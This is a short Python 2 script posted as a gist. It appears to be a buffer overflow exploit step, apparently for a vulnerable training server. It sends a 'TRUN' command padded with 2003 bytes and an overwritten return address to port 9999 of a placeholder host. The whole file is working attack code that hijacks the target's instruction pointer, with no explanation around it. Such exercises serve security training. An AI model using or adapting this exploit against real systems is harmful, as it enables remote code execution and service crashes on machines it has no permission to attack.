#date: 2022-11-17T17:09:49Z
#url: https://api.github.com/gists/f10876beeee109359a7936ec79ccee25
#owner: https://api.github.com/users/Tamirye

#!/usr/bin/python2
import sys
import socket
from time import sleep

buff = "A" * 2003
eip = "\xaf\x11\x50\x62"

try:
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.connect(('<server-ip>', 9999))
        payload = 'TRUN /.:/' + buff + eip
        soc.send(payload)
        soc.close()
except:
        print("[-] Error connecting to the server")
        sys.exit()
